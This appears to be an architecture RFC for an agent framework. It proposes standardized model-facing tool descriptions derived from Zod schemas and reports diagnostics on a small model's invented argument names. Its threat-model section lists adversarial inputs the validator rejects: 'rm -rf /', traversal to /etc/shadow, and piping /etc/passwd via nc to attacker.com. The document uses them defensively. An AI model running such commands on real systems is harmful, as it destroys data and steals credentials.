# ADR-0029 / RFC: Standardizing Model-Facing Tool Contracts and Schema Projection

## Document Information
- **Document Type**: Architecture RFC / Architecture Decision Record
- **Document Status**: Proposed (RFC Baseline — Phase 10 Baseline)
- **Date**: 2026-10-16
- **Governing Constitution**: [GEMINI.md](../../GEMINI.md) (Master Engineering Constitution Version 1.0)
- **Upstream ADRs**:
  - [ADR-0001: Adoption of Master Engineering Constitution and Architectural Boundaries](./ADR-0001-master-engineering-constitution.md)
  - [ADR-0003: Workspace Sandbox Boundary and Typed Tool System Architecture](./ADR-0003-workspace-and-typed-tools.md)
  - [ADR-0004: Tool Execution Gateway, Adapter Boundary, and Multi-Step Action Lifecycle](./ADR-0004-tool-execution-gateway-and-adapter-boundary.md)
  - [ADR-0008: Agent Brain Interface & Governed Action Proposal Boundary](./ADR-0008-agent-brain-action-proposal-boundary.md)
  - [ADR-0010: Model Provider Boundary & Provider-Neutral Inference Port](./ADR-0010-model-provider-boundary.md)
  - [ADR-0011: LiveAgentBrain Boundary, Context Translation, and Untrusted Action Proposal Pipeline](./ADR-0011-live-agent-brain-boundary.md)
  - [ADR-0027: Live Multi-File SWE Evaluation Harness for Frozen Reflex](./ADR-0027-live-swe-evaluation-of-frozen-reflex.md)
  - [ADR-0028: Isolation of Live SWE Experiment Harness and Explicit Entry Point](./ADR-0028-isolate-live-swe-experiment-harness.md)
- **Related Specifications**: [Typed Tools Architecture](../architecture/typed-tools.md), [Security Architecture](../architecture/security.md)

---

## 1. Problem Statement

### 1.1 Empirical Background (Phase 10E $\longrightarrow$ Phase 10F Evidence Chain)

In Phase 10D (commit `64d7479`), the production structured-output schema at the `LiveAgentBrain` $\longrightarrow$ `OllamaModelProvider` boundary was corrected to enforce a discriminated `anyOf` schema:
- **Variant 1**: Goal-Reached completion signal (`isGoalReached: true`, required `["isGoalReached", "proposalId", "contextSnapshotHash"]`).
- **Variant 2**: Governed Tool Action proposal (`isGoalReached: false`, required `["isGoalReached", "proposalId", "toolName", "inputPayload", "contextSnapshotHash"]`).

In Phase 10E, this fix was evaluated across 24 calibrated SWE trials with `llama3.2:3b`. The empirical findings established:
1. **Structured-Output Conformance Was Solved**: Exactly 0 malformed JSON outputs and 0 missing `toolName` occurrences were observed (compared to 21/24 in Phase 10A).
2. **ProposalValidator Reached Successfully**: 16 complete model action proposals passed JSON decoding and reached the application-layer [`ProposalValidator`](../../src/application/proposal-validator.ts).
3. **100% Tool-Input Validation Rejection**: 16/16 attempted proposals were rejected at Stage 9 of `ProposalValidator` with reason code `INVALID_TOOL_INPUT`.
4. **Dominant Failure Mechanism**: The local model consistently hallucinated argument parameter names for `search_code`:
   ```json
   {
     "pattern": "calculator",
     "filePaths": ["src/calculator.ts"]
   }
   ```
   whereas the production domain schema strictly requires:
   ```json
   {
     "query": "calculator"
   }
   ```
5. **Zero Execution Reach**: Because of this upstream argument rejection, 0/24 trials reached governed tool dispatch or container execution.
6. **Inference Latency Bottleneck**: 20/36 model calls exceeded the 120s CPU timeout ceiling in the multi-file SWE prompt context.

In Phase 10F, a controlled, isolated diagnostic was executed to determine whether `llama3.2:3b` is fundamentally incapable of generating compliant tool arguments, or whether the model-facing tool descriptions were insufficient:
- **Condition A (CURRENT production description)**: 0/5 valid proposals (100% `INVENTED_PATTERN_FIELD`, 0% valid tool input rate, mean latency 47.4s, 0 timeouts).
- **Condition B (EXPLICIT_SCHEMA description)**: 5/5 valid proposals (100% valid tool input rate, 0% invented fields, exact `{"query": "add"}` generated, mean latency 43.8s, 0 timeouts).
- **Condition C (EXAMPLE_GUIDED description)**: 5/5 valid proposals (100% valid tool input rate, 0% invented fields, exact `{"query": "add"}` generated, mean latency 41.5s, 0 timeouts).
- **Isolated Latency Findings**: In the minimal diagnostic prompt, 0/15 calls timed out (0.0% timeout rate), with an overall mean latency of 44.2s across all conditions.

### 1.2 Root Cause Analysis

Inspection of [`LiveAgentBrain.buildModelRequest`](../../src/application/live-agent-brain.ts#L234-L240) and [`src/domain/tool.ts`](../../src/domain/tool.ts#L146-L243) reveals the architectural root cause:
```typescript
sections.push("\n## Available Tools");
for (const tool of availableTools) {
  sections.push(
    `- ${tool.name} (capability: ${tool.requiredCapability}, idempotency: ${tool.idempotency}): ${tool.description}`
  );
}
```
Currently, the model prompt receives only a single natural-language sentence describing the tool's high-level purpose (e.g. `"Performs regex or literal text pattern matching across workspace files."`). 

The prompt provides:
- **Zero** parameter names (the model is never told the search string is named `query`).
- **Zero** parameter data types (strings, booleans, integer bounds, arrays).
- **Zero** required versus optional field distinctions.
- **Zero** negative constraints (e.g. that raw shell strings or unknown fields are rejected).

Because the downstream runtime validation strictly enforces `.strict()` on all tool Zod schemas in [`src/domain/tool-schemas.ts`](../../src/domain/tool-schemas.ts), any guessed, synonymic, or invented field automatically fails closed.

### 1.3 Four Distinct Architectural Layers

To avoid conceptual conflation, Emerald strictly distinguishes four separate layers:

```text
┌────────────────────────────────────────────────────────────────────────┐
│ 1. Model-Facing Description (Prompt Guidance Layer)                    │
│    - Human-readable / structured text in the prompt                    │
│    - Purely advisory guidance to assist the untrusted model            │
│    - NOT an authority boundary; CANNOT grant permissions               │
└────────────────────────────────────┬───────────────────────────────────┘
                                     │ Untrusted ActionProposal
                                     ▼
┌────────────────────────────────────────────────────────────────────────┐
│ 2. ProposalValidator (Application Boundary & Gatekeeper)               │
│    - 11-stage unskippable governance pipeline                          │
│    - Validates size, context hash, lease fencing, contract integrity   │
│    - Executes Zod safeParse with .strict() rejection                   │
└────────────────────────────────────┬───────────────────────────────────┘
                                     │ Validated Proposal
                                     ▼
┌────────────────────────────────────────────────────────────────────────┐
│ 3. Capability Policy (Governance Authority Layer)                      │
│    - PolicyEvaluator + MissionContract.spec.policy                     │
│    - Authoritative gate: can this run execute this capability?         │
│    - Independent of model prompt or tool argument contents             │
└────────────────────────────────────┬───────────────────────────────────┘
                                     │ Authorized Action
                                     ▼
┌────────────────────────────────────────────────────────────────────────┐
│ 4. Typed Runtime Contract & Execution Gateway                          │
│    - Immutable domain schemas (src/domain/tool-schemas.ts)             │
│    - Non-clamping resource ceiling bounds                              │
│    - Sandboxed dispatch via ToolExecutionGateway                       │
└────────────────────────────────────────────────────────────────────────┘
```

The model-facing description belongs solely to Layer 1. It provides guidance to reduce accidental syntax failures in stochastic reasoning models, but possesses zero authority.

---

## 2. Proposed Standardized Format

### 2.1 Canonical Model-Facing Specification Format

Every registered tool in Emerald Agent Fabric must expose a standardized model-facing representation within the prompt. The canonical format is defined as a structured markdown block communicating:

1. **Tool Name**: The exact registered string identifier recognized by [`isValidToolName`](../../src/domain/tool.ts#L50).
2. **Purpose**: A concise, non-speculative statement of what operation the tool performs.
3. **Execution Boundary**: Explicitly communicates whether the tool operates within the workspace filesystem or requires isolated container execution.
4. **Input Object Shape**: Explicit declaration that `inputPayload` must be a JSON object conforming strictly to the specified parameters.
5. **Parameter Inventory**:
   - `parameterName`: Exact case-sensitive key.
   - `type`: JSON primitive type (`string`, `number`, `boolean`, `array of string`).
   - `presence`: Explicitly labelled `[REQUIRED]` or `[OPTIONAL]`.
   - `default`: Default value applied by runtime schema if omitted.
   - `constraints`: Specific domain bounds (e.g., minimum length, integer boundaries, lexical path restrictions).
   - `description`: Concise semantic explanation of the parameter.
6. **Closed-Schema Invariant Warning**: Explicitly notifies the model that unknown or invented properties will trigger immediate rejection (`additionalProperties: false` / `.strict()`).
7. **Canonical Minimal Valid Example**: A single, complete, copy-pasteable JSON payload illustrating valid argument construction.
8. **Negative Guidance / Invalid-Field Warning**: Explicit warning highlighting common model hallucinations (e.g. `pattern` $\rightarrow$ use `query`, `command` string $\rightarrow$ use `argv` array).

### 2.2 Standard Canonical Template

```markdown
### Tool: `<tool_name>`
- **Purpose**: <Concise statement of single responsibility>
- **Isolation Boundary**: <WORKSPACE | SANDBOX>
- **Input Parameters (`inputPayload`)**:
  - `<param_name>` (`<type>`, **[REQUIRED | OPTIONAL]**, default: `<default_value>`): <Semantic description and domain constraints>
- **Closed Schema Rule**: Additional or unrecognized fields are STRICTLY FORBIDDEN and cause immediate proposal rejection.
- **Valid Example**:
  ```json
  { ... }
  ```
- **Invalid Field Warning**: Do NOT emit `<invented_fields>`; use `<canonical_fields>`.
```

---

## 3. Tool-by-Tool Inventory

This section audits the current six tools registered in Emerald Agent Fabric ([`src/domain/tool.ts`](../../src/domain/tool.ts) and [`src/domain/tool-schemas.ts`](../../src/domain/tool-schemas.ts)), documents their authoritative runtime contracts, and specifies the standardized model-facing representation for each.

### 3.1 `read_file`

#### Authoritative Runtime Contract
- **Capability Required**: `workspace.file.read`
- **Isolation Requirement**: `WORKSPACE`
- **Idempotency**: `IDEMPOTENT`
- **Zod Schema**:
  ```typescript
  export const ReadFileInputSchema = z
    .object({
      path: WorkspaceRelativePathSchema.describe("Relative path to file within workspace sandbox"),
      offsetLine: z.number().int().min(1, "offsetLine must be >= 1").optional().default(1),
      limitLines: z.number().int().min(1, "limitLines must be >= 1").max(5000, "limitLines cannot exceed 5000").optional().default(500),
      maxBytes: z.number().int().positive("maxBytes must be positive").optional().describe("Requested maximum bytes to read"),
    })
    .strict();
  ```

#### Proposed Standardized Model-Facing Description
```markdown
### Tool: `read_file`
- **Purpose**: Reads UTF-8 text content from a file inside the workspace sandbox with line offset and line limit bounds.
- **Isolation Boundary**: WORKSPACE
- **Input Parameters (`inputPayload`)**:
  - `path` (string, **[REQUIRED]**): Workspace-relative path to target file (e.g. "src/index.ts"). Must be a child file path; cannot be empty, absolute, or contain parent traversal ('..').
  - `offsetLine` (integer, **[OPTIONAL]**, default: 1): 1-indexed starting line number (must be >= 1).
  - `limitLines` (integer, **[OPTIONAL]**, default: 500): Maximum number of lines to read (integer between 1 and 5000).
  - `maxBytes` (integer, **[OPTIONAL]**): Maximum byte ceiling to read.
- **Closed Schema Rule**: Additional or unrecognized fields are STRICTLY FORBIDDEN and cause immediate proposal rejection.
- **Valid Example**:
  ```json
  {
    "path": "src/calculator.ts",
    "offsetLine": 1,
    "limitLines": 100
  }
  ```
- **Invalid Field Warning**: Do NOT emit `filePath`, `filename`, `startLine`, or `endLine`. Use `path`, `offsetLine`, and `limitLines`.
```

---

### 3.2 `search_code`

#### Authoritative Runtime Contract
- **Capability Required**: `workspace.code.search`
- **Isolation Requirement**: `WORKSPACE`
- **Idempotency**: `IDEMPOTENT`
- **Zod Schema**:
  ```typescript
  export const SearchCodeInputSchema = z
    .object({
      query: z.string().min(1, "query cannot be empty").max(1000, "query too long").describe("Search string or regex query"),
      isRegex: z.boolean().default(false),
      path: WorkspaceDirectoryPathSchema.optional().default("."),
      filePattern: z.string().min(1, "filePattern cannot be empty").optional().default("*"),
      maxResults: z.number().int().min(1, "maxResults must be >= 1").max(1000, "maxResults cannot exceed 1000").optional().default(50),
      maxBytes: z.number().int().positive("maxBytes must be positive").optional().describe("Requested maximum output bytes"),
    })
    .strict();
  ```

#### Proposed Standardized Model-Facing Description
```markdown
### Tool: `search_code`
- **Purpose**: Performs literal text substring matching or regex pattern matching across workspace files.
- **Isolation Boundary**: WORKSPACE
- **Input Parameters (`inputPayload`)**:
  - `query` (string, **[REQUIRED]**): The text substring or regular expression pattern to search for (1 to 1000 characters).
  - `isRegex` (boolean, **[OPTIONAL]**, default: false): Set to true if `query` is a regular expression; false for literal substring search.
  - `path` (string, **[OPTIONAL]**, default: "."): Workspace-relative directory to search within ("." denotes workspace root). Cannot contain parent traversal ('..').
  - `filePattern` (string, **[OPTIONAL]**, default: "*"): Glob pattern to filter searched files (e.g. "*.ts", "*.json").
  - `maxResults` (integer, **[OPTIONAL]**, default: 50): Maximum number of matching lines to return (integer between 1 and 1000).
  - `maxBytes` (integer, **[OPTIONAL]**): Maximum output byte limit.
- **Closed Schema Rule**: Additional or unrecognized fields are STRICTLY FORBIDDEN and cause immediate proposal rejection.
- **Valid Example**:
  ```json
  {
    "query": "calculateTotal",
    "path": ".",
    "filePattern": "*.ts"
  }
  ```
- **Invalid Field Warning**: Do NOT emit `pattern`, `filePaths`, `files`, or `directory`. The search pattern parameter is strictly named `query`.
```

---

### 3.3 `git_status`

#### Authoritative Runtime Contract
- **Capability Required**: `git.read`
- **Isolation Requirement**: `WORKSPACE`
- **Idempotency**: `IDEMPOTENT`
- **Zod Schema**:
  ```typescript
  export const GitStatusInputSchema = z
    .object({
      path: WorkspaceDirectoryPathSchema.optional(),
    })
    .strict();
  ```

#### Proposed Standardized Model-Facing Description
```markdown
### Tool: `git_status`
- **Purpose**: Inspects Git working tree status, returning clean/dirty state and lists of modified, added, deleted, and untracked files.
- **Isolation Boundary**: WORKSPACE
- **Input Parameters (`inputPayload`)**:
  - `path` (string, **[OPTIONAL]**, default: "."): Workspace-relative directory path to scope git status inspection ("." for workspace root).
- **Closed Schema Rule**: Additional or unrecognized fields are STRICTLY FORBIDDEN and cause immediate proposal rejection.
- **Valid Example**:
  ```json
  {
    "path": "."
  }
  ```
- **Invalid Field Warning**: Do NOT emit `options`, `staged`, `verbose`, or flags. An empty object `{}` is valid.
```

---

### 3.4 `git_diff`

#### Authoritative Runtime Contract
- **Capability Required**: `git.read`
- **Isolation Requirement**: `WORKSPACE`
- **Idempotency**: `IDEMPOTENT`
- **Zod Schema**:
  ```typescript
  export const GitDiffInputSchema = z
    .object({
      path: WorkspaceDirectoryPathSchema.optional(),
      staged: z.boolean().default(false),
      maxBytes: z.number().int().positive("maxBytes must be positive").optional().describe("Requested maximum diff bytes"),
    })
    .strict();
  ```

#### Proposed Standardized Model-Facing Description
```markdown
### Tool: `git_diff`
- **Purpose**: Computes unified diff of working tree modifications against the baseline commit or staged index.
- **Isolation Boundary**: WORKSPACE
- **Input Parameters (`inputPayload`)**:
  - `path` (string, **[OPTIONAL]**): Workspace-relative path to scope diff to a specific file or subdirectory.
  - `staged` (boolean, **[OPTIONAL]**, default: false): When true, inspects staged changes; when false, inspects unstaged working tree changes.
  - `maxBytes` (integer, **[OPTIONAL]**): Maximum output byte limit for diff text.
- **Closed Schema Rule**: Additional or unrecognized fields are STRICTLY FORBIDDEN and cause immediate proposal rejection.
- **Valid Example**:
  ```json
  {
    "staged": false
  }
  ```
- **Invalid Field Warning**: Do NOT emit `cached`, `commit`, `branch`, or `files`. Use `staged: true` to inspect staged changes.
```

---

### 3.5 `write_file`

#### Authoritative Runtime Contract
- **Capability Required**: `workspace.file.write`
- **Isolation Requirement**: `WORKSPACE`
- **Idempotency**: `NON_IDEMPOTENT`
- **Zod Schema**:
  ```typescript
  export const WriteFileInputSchema = z
    .object({
      path: WorkspaceRelativePathSchema.describe("Relative path to file within workspace sandbox"),
      content: z.string().describe("UTF-8 text content to write"),
      overwrite: z.boolean().default(true),
      maxBytes: z.number().int().positive("maxBytes must be positive").optional().describe("Requested maximum bytes to write"),
    })
    .strict();
  ```

#### Proposed Standardized Model-Facing Description
```markdown
### Tool: `write_file`
- **Purpose**: Atomically creates or completely overwrites a text file within the workspace sandbox with full content.
- **Isolation Boundary**: WORKSPACE
- **Input Parameters (`inputPayload`)**:
  - `path` (string, **[REQUIRED]**): Workspace-relative path to target file (e.g. "src/calculator.ts"). Cannot be empty, absolute, or contain parent traversal ('..').
  - `content` (string, **[REQUIRED]**): Complete UTF-8 text content to write to the file.
  - `overwrite` (boolean, **[OPTIONAL]**, default: true): Set to true to overwrite existing file; false to fail if file already exists.
  - `maxBytes` (integer, **[OPTIONAL]**): Maximum allowed content byte size.
- **Closed Schema Rule**: Additional or unrecognized fields are STRICTLY FORBIDDEN and cause immediate proposal rejection.
- **Valid Example**:
  ```json
  {
    "path": "src/calculator.ts",
    "content": "export function add(a: number, b: number): number {\n  return a + b;\n}\n",
    "overwrite": true
  }
  ```
- **Invalid Field Warning**: Do NOT emit `filePath`, `text`, `data`, `append`, or `mode`. File path must be `path` and file body must be `content`.
```

---

### 3.6 `run_command`

#### Authoritative Runtime Contract
- **Capability Required**: `process.execute`
- **Isolation Requirement**: `SANDBOX`
- **Idempotency**: `NON_IDEMPOTENT`
- **Zod Schema**:
  ```typescript
  export const RunCommandInputSchema = z
    .object({
      argv: z
        .array(z.string())
        .min(1, "argv must contain at least the executable command")
        .superRefine((arr, ctx) => {
          if (!arr[0] || arr[0].trim().length === 0) {
            ctx.addIssue({
              code: z.ZodIssueCode.custom,
              message: "Executable name (argv[0]) cannot be empty or whitespace only",
            });
          }
        })
        .describe("Array of discrete arguments where argv[0] is the executable name"),
      cwd: WorkspaceDirectoryPathSchema.optional().default("."),
      timeoutMs: z.number().int().positive("timeoutMs must be positive").optional().describe("Requested timeout in ms"),
      maxOutputBytes: z.number().int().positive("maxOutputBytes must be positive").optional().describe("Requested maximum output bytes"),
    })
    .strict();
  ```

#### Proposed Standardized Model-Facing Description
```markdown
### Tool: `run_command`
- **Purpose**: Executes a specific non-interactive command inside the isolated container sandbox using discrete argument tokens.
- **Isolation Boundary**: SANDBOX (Container execution)
- **Input Parameters (`inputPayload`)**:
  - `argv` (array of string, **[REQUIRED]**): Non-empty array of discrete argument tokens where `argv[0]` is the executable command (e.g. ["npm", "test"]). Raw shell strings are categorically rejected.
  - `cwd` (string, **[OPTIONAL]**, default: "."): Relative workspace directory from which to execute the command ("." denotes workspace root).
  - `timeoutMs` (integer, **[OPTIONAL]**): Execution timeout in milliseconds (subject to mission contract ceiling).
  - `maxOutputBytes` (integer, **[OPTIONAL]**): Maximum stdout/stderr output bytes to capture.
- **Closed Schema Rule**: Additional or unrecognized fields are STRICTLY FORBIDDEN and cause immediate proposal rejection.
- **Valid Example**:
  ```json
  {
    "argv": ["npm", "test", "--", "-t", "calculator"],
    "cwd": "."
  }
  ```
- **Invalid Field Warning**: Do NOT emit a single shell command string like `{"command": "npm test"}` or `{"cmd": "npm test"}`. Arguments must be provided as an array of discrete tokens in `argv`.
```

---

## 4. Security Boundary & Defense in Depth

### 4.1 Fundamental Invariant: Model Guidance is NOT an Authority Boundary

A core principle of Emerald Agent Fabric (Constitution Section 12) is that **model output is untrusted and can be malicious, confused, or adversarial**:
$$\text{Model Output} \subseteq \text{Untrusted Input}$$

Model-facing tool descriptions serve exclusively as cognitive scaffolding to help cooperative reasoning models emit syntactically and semantically valid JSON payloads. They do **NOT**:
1. Grant or elevate authority.
2. Act as authorization gates.
3. Relax runtime security validation.
4. Replace sandbox containment.

### 4.2 Defense-in-Depth Pipeline

Authority is enforced strictly downstream through the unskippable execution chain:

```text
Model Output
   ↓
[Stage 1-3] Structural & Size Parsing (MAX_PROPOSAL_BYTES, forbidden authority keys stripped)
   ↓
[Stage 4-6] Context & Lease Fencing (contextHash match, run active, lease valid, contract unrevoked)
   ↓
[Stage 7-8] Registry & Capability Authorization (Tool registered, PolicyEvaluator approves capability)
   ↓
[Stage 9] Input Schema Enforcement (Zod safeParse with .strict() rejection)
   ↓
[Stage 10] Resource Ceiling Bounds Check (timeoutMs, maxBytes <= MissionContract limits)
   ↓
Reflex Proposal Interceptor (Failure-loop detection, budget checks, safety rules)
   ↓
ToolExecutionGateway (Lexical path boundary check, non-clamping ceiling enforcement)
   ↓
Sandbox / Container Isolation (Non-root, no-new-privileges, dropped capabilities, CPU/mem quotas)
```

### 4.3 Resistance to Adversarial Model Outputs

Even if an untrusted or jailbroken model generates:
- **Unknown fields**: E.g. `{"query": "add", "admin": true, "executeRaw": "rm -rf /"}` $\longrightarrow$ Rejected by `ProposalValidator` Stage 9 (`.strict()`).
- **Path traversal attacks**: E.g. `{"path": "../../../../etc/shadow"}` $\longrightarrow$ Rejected by `WorkspaceRelativePathSchema` in Stage 9 before tool dispatch.
- **Raw shell injection**: E.g. `{"command": "cat /etc/passwd | nc attacker.com 4444"}` $\longrightarrow$ Rejected by Stage 9 because `argv` is missing and `command` is unknown.
- **Ceiling bypass attempts**: E.g. `{"argv": ["sleep", "1000"], "timeoutMs": 99999999}` $\longrightarrow$ Rejected by Stage 10 (`RESOURCE_LIMIT_EXCEEDED`).
- **Unauthorized tool calls**: E.g. proposing `run_command` in a read-only repository inspection mission $\longrightarrow$ Denied by Stage 8 (`UNAUTHORIZED_CAPABILITY`) via `PolicyEvaluator`.

Under no circumstances may prompt-level descriptions be trusted to enforce security boundaries.

---

## 5. Schema Ownership & Architectural Comparison

We analyze four potential architectural designs for maintaining model-facing tool descriptions:

### 5.1 Option A: Hand-Written Model-Facing Descriptions
Hardcode the formatted markdown/prose descriptions directly inside `LiveAgentBrain` or `src/domain/tool.ts`.

- **Duplication**: High. Field names, types, and defaults are manually duplicated from `tool-schemas.ts`.
- **Drift Risk**: High. Modifying a Zod schema parameter inevitably creates silent drift where the prompt instructs the model to emit obsolete or missing arguments.
- **Readability**: High.
- **Determinism**: High.
- **Security**: Neutral (runtime rejects drift, but causes unnecessary task failures).
- **Testability**: Low.
- **Maintenance Cost**: High.

### 5.2 Option B: Independent Hand-Written JSON Schemas
Maintain standalone `.json` schema files for model prompts alongside TypeScript Zod schemas.

- **Duplication**: Extreme. Dual-schema maintenance across two distinct schema definition formats.
- **Drift Risk**: Critical. Structural discrepancies between Zod and JSON Schema definitions emerge rapidly during refactors.
- **Readability**: Moderate. Raw JSON schemas consume substantial prompt token volume and context budget.
- **Determinism**: High.
- **Security**: Neutral.
- **Testability**: Moderate (requires complex schema-diff testing suites).
- **Maintenance Cost**: Very High.

### 5.3 Option C: Pure Automatic Programmatic Projection from Zod Schemas
Inspect the Zod AST at runtime to programmatically extract parameter names, types, optionality, and defaults with zero human annotation.

- **Duplication**: Zero. Single source of truth.
- **Drift Risk**: Zero. Prompt parameters are generated directly from the live Zod schema.
- **Readability**: Low-to-Moderate. Pure AST introspection generates sterile, mechanical parameter lists lacking clear natural-language explanations, domain context, copy-pasteable examples, or negative invalid-field warnings.
- **Determinism**: High.
- **Security**: High.
- **Testability**: High.
- **Maintenance Cost**: Low, but high implementation complexity for custom Zod AST traversal (e.g. unwrapping `ZodEffects`, `ZodDefault`, `ZodOptional`, `superRefine`).

### 5.4 Option D (Recommended): Hybrid — Typed Runtime Contract as Source of Truth + Structured Semantic Metadata Projection

In this architecture:
1. **Authoritative Source of Truth**: The runtime typed tool contract (`tool-schemas.ts` and `ToolDefinition` in `tool.ts`) remains the immutable, single source of truth for runtime validation and parameter boundaries.
2. **Semantic Metadata Extension**: Each `ToolDefinition<TName>` record is extended with a typed, declarative metadata descriptor specifying:
   - Purpose and boundary documentation.
   - Parameter-level semantic explanations, defaults, and examples.
   - Common invalid-field warnings.
3. **Deterministic Projection Function**: A pure, stateless projection utility (`projectToolDescription(toolDef)`) formats the metadata and schema attributes into the canonical model-facing specification format.
4. **Compile-Time and Test-Time Invariants**: A TypeScript contract ensures every property defined in `toolDef.inputSchema` must have an entry in the tool's parameter metadata, and unit tests verify zero parameter drift.

#### Evaluation Matrix

| Criterion | Option A (Hand-Written) | Option B (Dual JSON Schema) | Option C (Pure Zod AST) | Option D (Hybrid Projection) |
| :--- | :--- | :--- | :--- | :--- |
| **Duplication** | High | Extreme | Zero | Minimal (Metadata Only) |
| **Drift Risk** | High | Critical | Zero | Zero (Enforced by Unit Tests) |
| **Prompt Readability** | High | Low | Low-Moderate | Highest |
| **Determinism** | High | High | High | 100% Deterministic |
| **Security Assurance** | Standard | Standard | High | High (Explicit Closed Rule) |
| **Testability** | Poor | Complex | Moderate | Excellent (Contract Tests) |
| **Future Model Providers**| Low | Provider-specific | Moderate | High (Multi-Target Projector)|
| **Maintenance Cost** | High | Very High | Moderate | Low |

### 5.5 Recommendation

We recommend **Option D (Hybrid: Typed Runtime Contract + Structured Semantic Metadata Projection)**.

Option D adheres directly to the Master Engineering Constitution:
- `CORRECTNESS > COMPLEXITY`: Parameter contracts are tied directly to domain schemas rather than hand-maintained duplicates.
- `ARCHITECTURE > FEATURES`: Defines a clean projection boundary that can emit Markdown bullet points for local SLMs (e.g. Ollama `llama3.2:3b`), or standard OpenAI/Anthropic tool schemas for future cloud adapters without modifying domain tool contracts.
- `MINIMAL COMPLEXITY`: Avoids brittle runtime Zod AST decompilers while eliminating silent documentation drift through automated contract tests.

---

## 6. Context-Budget and Latency Implications

### 6.1 The Non-Trivial Cost of Rich Prompt Descriptions

While Phase 10F showed that explicit schema descriptions added negligible latency overhead in an isolated diagnostic call (~44s vs ~47s, 0 timeouts), Phase 10E proved that in realistic multi-file SWE tasks, **prompt size creates acute CPU inference latency pressure**:
- 20/36 model calls in Phase 10E timed out at 120,000ms.
- Local SLMs on CPU hardware have limited prompt-evaluation (prefill) throughput (typically ~10–25 tokens/second on standard workstation CPUs).

Expanding tool descriptions from 1 line per tool (~25 tokens) to comprehensive parameter documentation (~100 tokens per tool) adds approximately:
$$\Delta \text{Tokens} \approx 6 \times 75 = 450 \text{ tokens}$$

On a CPU-only workstation, prefilling 450 additional tokens across every agent step introduces approximately 15–30 seconds of prefill latency per step. Richer tool descriptions are **not free**.

### 6.2 Latency and Context Measurement Plan

Before standardizing these descriptions in production benchmarks, the system must measure and track:

1. **Prompt Payload Bytes (`promptBytes`)**: Exact UTF-8 byte count of the serialized model request.
2. **Context Token Count (`promptTokens`)**: Measured via model provider token counts or tokenizer approximations.
3. **Tool Definition Overhead (`toolDefinitionTokens`)**: Isolated token count attributable specifically to the `Available Tools` section of the prompt.
4. **Time to First Token / Prefill Duration (`prefillMs`)**: Wall-clock time required for the local model engine to ingest the prompt before emitting the first output token.
5. **Generation Duration (`generationMs`)**: Wall-clock time required to generate the output payload.
6. **Step Timeout Rate (`timeoutRate`)**: Proportion of model invocations exceeding the 120s budget ceiling.
7. **Valid Tool Input Rate (`validInputRate`)**: Proportion of attempted proposals passing Stage 9 of `ProposalValidator`.

The optimization metric for future evaluation is:
$$\text{Net Execution Yield} = \frac{\text{Valid Governed Dispatches}}{\text{Total Wall-Clock Time}}$$
An increase in schema compliance that causes widespread CPU timeouts will net-reduce execution yield. Therefore, descriptions must remain compact, concise, and devoid of verbose prose.

---

## 7. Testing Strategy

The standardized model-facing tool projection architecture will be verified through the following suite of automated contract and invariant tests:

### 7.1 Projection Completeness and Formatting Tests
- **All Tools Covered**: Assert that every tool registered in [`INITIAL_TOOL_DEFINITIONS`](../../src/domain/tool.ts#L244) produces a non-empty, valid specification.
- **Required Sections Present**: Assert that each projected description contains Purpose, Boundary, Parameters, Closed Schema Rule, Valid Example, and Invalid Field Warning.
- **Deterministic Output**: Assert that repeated calls to the projection function produce byte-identical string outputs.

### 7.2 Parameter Schema Parity and Drift-Detection Tests
- **Parameter Name Parity**: For each tool, assert that every key defined in the tool's runtime Zod schema (`toolDef.inputSchema._def`) is present in the projected parameter inventory.
- **Requiredness Alignment**: Assert that parameters marked `optional` in Zod are labelled `[OPTIONAL]` in the projection, and non-optional parameters are labelled `[REQUIRED]`.
- **Default Value Integrity**: Assert that default values specified in Zod `.default(...)` match the displayed defaults in the projection.

### 7.3 Security and Authority Leakage Tests
- **Zero Authority Leaking**: Assert that no model-facing tool definition or prompt section mentions internal authority fields:
  - `workerId`
  - `leaseId`
  - `contractBinding` / `contractId`
  - `mountPath` / `containerMountPath`
  - `maxAttempts` / `totalAttempts`
  - `retryCount`
  - `executionStatus`
- **Zero Secrets / Host Environment Leaks**: Assert that host paths, API keys, database credentials, or environment secrets never appear in serialized tool descriptions.

### 7.4 Runtime Strictness Verification
- **Rejection of Invented Fields**: Assert that submitting payloads with unrecognized keys (e.g. `pattern` for `search_code`, `command` for `run_command`, `filePath` for `read_file`) fails closed with `INVALID_TOOL_INPUT` under `ProposalValidator`.

---

## 8. Future Experiment: Phase 10H (Conceptual Specification)

### 8.1 Objective
Empirically verify across **all six tools** that standardized model-facing descriptions enable `llama3.2:3b` on CPU to reliably generate schema-compliant tool arguments, before expanding to full-scale multi-file SWE benchmark runs.

### 8.2 Experimental Matrix (Conceptual Only — Do Not Execute in this Phase)
- **Model**: `llama3.2:3b` (via local Ollama, CPU-bound, temperature 0.0, seed fixed, timeout 120,000ms).
- **Tool Suite**: All 6 tools:
  1. `read_file`
  2. `write_file`
  3. `search_code`
  4. `git_status`
  5. `git_diff`
  6. `run_command`
- **Conditions**:
  - `Condition A (BASELINE)`: Current 1-line tool descriptions.
  - `Condition B (STANDARDIZED)`: Standardized Option D projection descriptions.
- **Trials**: 5 trials per tool $\times$ 2 conditions = 60 total diagnostic trials.
- **Task Directives**: Minimal, deterministic instructions designed to test argument syntax without multi-file context noise (e.g. `"Read lines 10 to 50 of file 'src/index.ts'"`).

### 8.3 Measured Metrics
- `Valid Tool Input Rate (%)`: Proportion passing `ProposalValidator` Stage 9.
- `Invented Field Rate (%)`: Proportion emitting non-schema keys.
- `Missing Field Rate (%)`: Proportion omitting required keys.
- `Timeout Rate (%)`: Proportion exceeding 120s budget ceiling.
- `Prompt Overhead (Tokens/Bytes)`: Exact delta in prompt size.

*(Note: In accordance with Constitution Rule 28, results will not be fabricated or assumed prior to empirical execution.)*

---

## 9. Explicit Non-Goals

To maintain strict change boundaries (Constitution Section 4), this RFC explicitly establishes the following non-goals:
- **No Production Code Modifications**: Does NOT modify [`src/application/live-agent-brain.ts`](../../src/application/live-agent-brain.ts), [`src/domain/tool.ts`](../../src/domain/tool.ts), or [`src/domain/tool-schemas.ts`](../../src/domain/tool-schemas.ts).
- **No Runtime Schema Changes**: Does NOT alter the underlying Zod contracts or relax `.strict()` validation.
- **No Proposal Repair or Argument Coercion**: Emerald categorically rejects automated guessing, parameter renaming, or silent rewriting of untrusted model arguments.
- **No Reflex Tuning**: Does NOT modify `RuleBasedReflex`, heuristics, reason codes, or frozen hash (`5e71ea253972678379f2e16c145d4b314e8de1b70c9eb0ac69d7a51540376252`).
- **No Policy Changes**: Does NOT modify `PolicyEvaluator` or capability bindings.
- **No Model Substitution**: Does NOT substitute larger or cloud-based models.
